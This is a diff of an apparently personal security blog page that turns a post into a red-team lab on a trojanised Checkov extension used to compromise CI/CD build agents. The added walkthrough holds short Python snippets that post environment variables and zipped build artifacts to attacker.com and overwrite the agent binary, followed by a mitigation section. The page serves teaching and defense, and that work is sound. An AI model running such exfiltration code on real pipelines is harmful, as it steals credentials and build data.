@@ -15,7 +15,7 @@
         <link rel="canonical" href="https://ytimyno.github.io/blog/technical/cicd/exec_agents/">
       
       
-        <link rel="prev" href="../../../cicd/execution_agents/">
+        <link rel="prev" href="../../../mcp/mcp/">
       
       
         <link rel="next" href="../../py_git_revshell/">
@@ -68,7 +68,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#from-open-source-package-to-credential-exfiltration-from-your-build-environment" class="md-skip">
+        <a href="#lab-exploiting-a-trojanized-open-source-package-in-cicd-pipelines" class="md-skip">
           Skip to content
         </a>
       
@@ -346,6 +346,71 @@
       
   
   
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    AI
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            AI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mcp/mcp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MCP Kool Aid
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
     
   
   
@@ -358,10 +423,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
         
           
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -373,8 +438,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
-          <label class="md-nav__title" for="__nav_3">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             Playground
           </label>
@@ -435,51 +500,54 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#walkthrough" class="md-nav__link">
+  <a href="#description" class="md-nav__link">
     <span class="md-ellipsis">
-      Walkthrough
+      Description
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Walkthrough">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#step-1" class="md-nav__link">
-    <span class="md-ellipsis">
-      Step #1
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-2" class="md-nav__link">
-    <span class="md-ellipsis">
-      Step #2
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Step #3
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
+  <a href="#scenario" class="md-nav__link">
     <span class="md-ellipsis">
-      Conclusion
+      Scenario
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lab-prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lab prerequisites
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#learning-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Learning outcomes
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#difficulty" class="md-nav__link">
+    <span class="md-ellipsis">
+      Difficulty
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#focus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Focus
     </span>
   </a>
   
@@ -572,51 +640,54 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#walkthrough" class="md-nav__link">
+  <a href="#description" class="md-nav__link">
     <span class="md-ellipsis">
-      Walkthrough
+      Description
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Walkthrough">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#step-1" class="md-nav__link">
-    <span class="md-ellipsis">
-      Step #1
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-2" class="md-nav__link">
-    <span class="md-ellipsis">
-      Step #2
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Step #3
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
+  <a href="#scenario" class="md-nav__link">
     <span class="md-ellipsis">
-      Conclusion
+      Scenario
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lab-prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lab prerequisites
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#learning-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Learning outcomes
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#difficulty" class="md-nav__link">
+    <span class="md-ellipsis">
+      Difficulty
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#focus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Focus
     </span>
   </a>
   
@@ -641,52 +712,91 @@
   
 
 
-<h1 id="from-open-source-package-to-credential-exfiltration-from-your-build-environment">From open source package to credential exfiltration from your build environment</h1>
-<blockquote>
-<p>The problem statement and state of the art when it comes to the security of build environments is introduced in <a href="https://ytimyno.github.io/blog/cicd/execution_agents/">CI/CD Build Servers</a>. This is a practical walkthrough of a scenario using a trusted open source package to have access to the build environment and then exploit it.</p>
-</blockquote>
-<p>Sometimes it is hard to articulate the <em>why should I care about this</em>. This is a report on a hypothetical scenario where we have a trojanised open-source tool integrated in our build pipelines, and how that can be leveraged to exfiltrate data/credentials, persistence, lateral movement and Denial-of-Service/Wallet attacks. </p>
-<p>It consists of:</p>
-<ol>
-<li>Creating a malicious Open Source "extra check" for Checkov </li>
-<li>(Assumes the user decides to use that extra check fuctionality as there is a GitHub page that looks good enough)</li>
-<li>When the clitool is executed with the trojanised payload, it will silently attempt to exploit the host</li>
-</ol>
-<p>And the exploit shows this is possible:</p>
+<h1 id="lab-exploiting-a-trojanized-open-source-package-in-cicd-pipelines">Lab: Exploiting a Trojanized Open Source Package in CI/CD Pipelines</h1>
+<h3 id="description">Description</h3>
+<p>In this red team lab, you'll simulate a real-world attack against a CI/CD build environment by leveraging a trojanized open-source package. You'll see how integrating a seemingly useful tool can lead to credential theft, data exfiltration, and persistent compromise of build infrastructure.</p>
+<h3 id="scenario">Scenario</h3>
+<p>Your organization relies on open-source tools to enforce policy and security in CI/CD pipelines. A new "extra check" for Checkov appears on GitHub, promising enhanced functionality. Unbeknownst to the team, this package contains a hidden payload that exploits the build agent's environment, exfiltrates credentials, and establishes persistence.</p>
+<h3 id="lab-prerequisites">Lab prerequisites</h3>
 <ul>
-<li>Pulling a 'malicious' packages from the outside</li>
-<li>Dumping environment variables (including the build service account 'temporary' access token)</li>
-<li>Zipping the working directory of the build agent and exfiltrating it (includes logs, built artefacts of every pipeline, from any project, that has being executed)</li>
-<li>Replacing the binary that controls the Azure DevOps build agent service with one that skips the secret redaction for future pipelines executed</li>
+<li>Basic knowledge of CI/CD pipelines (Azure DevOps, GitHub Actions, etc.)</li>
+<li>Familiarity with Python and CLI tools</li>
+<li>Understanding of environment variables and build agent architecture</li>
 </ul>
-<h2 id="walkthrough">Walkthrough</h2>
-<blockquote>
-<p><strong>Scenario</strong>: You have a goal. You need to ensure the resources in your development pipelines are being configured according to your policy. You find a GitHub project that does exactly what you need. This project is a fork of the widely used <a href="https://github.com/bridgecrewio/checkov">Checkov</a> project, which you already use anyway, but adds some useful custom checks.</p>
-</blockquote>
-<p>This is not a new scenario (reused from an earlier article), but it's just as plausible. Alternatively, this could be done by creating any 'useful' CLI tool. I like this scenario because Checkov itself is already trusted and expected to be ran in pipelines, and all we are doing is adding an extension to its out-of-the-box functionality.</p>
-<h3 id="step-1">Step #1</h3>
-<p>When running Checkov checks (custom or not), you are running code, in your environment, with all the permissions the user runinng it has. We will extend the malicious checks in <a href="https://github.com/ytimyno/pac-on-rails/blob/main/checks/malicious">the pac-on-rails GitHub repository</a> to have an additional a malicious check (COOL_MALI_3) that takes advantage of the access to the underlying build agent.</p>
-<h3 id="step-2">Step #2</h3>
-<p>Assuming the user found this project, read the README, which made it look like any other useful open source CLI tool hosted on GitHub, the user adds a simple switch to the pipeline.
-The user runs the pipeline and gets the desired result.</p>
-<h3 id="step-3">Step #3</h3>
-<p>When the pipeline was run, alongside the useful functionality, the trojanised payload also executed and we are to confirm all our objectives were met.</p>
+<h3 id="learning-outcomes">Learning outcomes</h3>
 <ul>
-<li>Pulling 'malicious' packages from the outside</li>
-<li>Dumping environment variables (including the build service account 'temporary' access token)</li>
-<li>Zipping the working directory of the build agent and exfiltrating it (includes logs, built artefacts of every pipeline, from any project, that has being executed)</li>
-<li>Replacing the binary that controls the Azure DevOps build agent service with one that skips the secret redaction for future pipelines executed</li>
+<li>Assessing the risk of open-source supply chain attacks</li>
+<li>Identifying and exploiting build agent permissions</li>
+<li>Exfiltrating sensitive data from CI/CD environments</li>
+<li>Achieving persistence by modifying build agent binaries</li>
+<li>Understanding defense strategies for build environments</li>
 </ul>
+<h3 id="difficulty">Difficulty</h3>
+<p>Intermediate</p>
+<h3 id="focus">Focus</h3>
+<p>Red Team / Supply Chain Security</p>
+<hr />
+<h1 id="real-world-context">Real-world context</h1>
+<p>CI/CD build agents often run with elevated permissions and access sensitive credentials, artifacts, and logs. Integrating untrusted packages can expose the environment to attacks that are hard to detect and remediate.</p>
+<hr />
+<h1 id="walkthrough">Walkthrough</h1>
+<h2 id="attack">Attack</h2>
+<p>Let's begin the engagement!</p>
+<h3 id="step-1-discovering-the-malicious-package">Step 1: Discovering the Malicious Package</h3>
+<p>You find a GitHub project that extends Checkov with custom checks. The README looks legitimate, and the functionality matches your needs.</p>
 <blockquote>
-<p>More details to be added soon</p>
+<p>Example: https://github.com/ytimyno/pac-on-rails/blob/main/checks/malicious</p>
 </blockquote>
-<h2 id="conclusion">Conclusion</h2>
-<p>Only do this at home :)</p>
-<h1 id="other-not-so-interesting-facts">Other (not so) interesting facts</h1>
+<h3 id="step-2-integrating-the-package">Step 2: Integrating the Package</h3>
+<p>You add the package to your pipeline configuration and run a build. The pipeline executes as expected, but the malicious payload is triggered.</p>
+<h3 id="step-3-payload-execution">Step 3: Payload Execution</h3>
+<p>The trojanized package performs several actions:</p>
 <ul>
-<li>Running containarised jobs and tasks in pipelines makes the initialisation of the pipeline workflows take anytime from quick to an annoying amount of time depending on the availability of the images required being already in the build agent.</li>
-<li>The build agent access token is not invalidated after each run. A new one is generated, but the old one stays active (for some time).</li>
-<li>Windows Defender definetely recognised obvious payloads from Metasploit :D</li>
+<li><strong>Pulls additional malicious packages</strong> from external sources</li>
+<li><strong>Dumps environment variables</strong>, including build service account tokens</li>
+<li><strong>Zips and exfiltrates the working directory</strong>, capturing logs and artifacts</li>
+<li><strong>Replaces the build agent binary</strong> to disable secret redaction in future runs</li>
+</ul>
+<h4 id="example-exfiltrating-environment-variables">Example: Exfiltrating Environment Variables</h4>
+<pre><code class="language-python">import os
+import requests
+
+env_vars = os.environ
+requests.post(&quot;https://attacker.com/exfil&quot;, data=str(env_vars))
+</code></pre>
+<h4 id="example-zipping-and-exfiltrating-artifacts">Example: Zipping and Exfiltrating Artifacts</h4>
+<pre><code class="language-python">import shutil
+shutil.make_archive('artifacts', 'zip', '/path/to/build/dir')
+requests.post(&quot;https://attacker.com/upload&quot;, files={'file': open('artifacts.zip', 'rb')})
+</code></pre>
+<h4 id="example-replacing-build-agent-binary">Example: Replacing Build Agent Binary</h4>
+<pre><code class="language-python">import shutil
+shutil.copyfile('malicious_agent.exe', '/path/to/agent/agent.exe')
+</code></pre>
+<h3 id="step-4-persistence-and-lateral-movement">Step 4: Persistence and Lateral Movement</h3>
+<p>With the build agent compromised, future pipelines run without secret redaction, allowing further credential theft and attacks across projects.</p>
+<hr />
+<h2 id="defense">Defense</h2>
+<h3 id="key-weaknesses">Key Weaknesses</h3>
+<ul>
+<li><strong>Trusting open-source packages without review</strong></li>
+<li><strong>Running build agents with excessive permissions</strong></li>
+<li><strong>Storing credentials as environment variables</strong></li>
+<li><strong>Lack of monitoring for agent binary integrity</strong></li>
+</ul>
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+<ul>
+<li>Use containerized build agents with ephemeral environments</li>
+<li>Rotate and invalidate build service account tokens after each run</li>
+<li>Implement code signing and integrity checks for build agent binaries</li>
+<li>Monitor for unusual outbound network activity and file changes</li>
+</ul>
+<hr />
+<h2 id="further-reading">Further Reading</h2>
+<ul>
+<li><a href="https://supplychainsecurity.com/">Supply Chain Security in CI/CD</a></li>
+<li><a href="https://learn.microsoft.com/en-us/security/devops/secure-pipelines">Microsoft: Securing Build Pipelines</a></li>
+<li><a href="https://owasp.org/www-project-cicd-security/">OWASP: CI/CD Security</a></li>
 </ul>
 
 
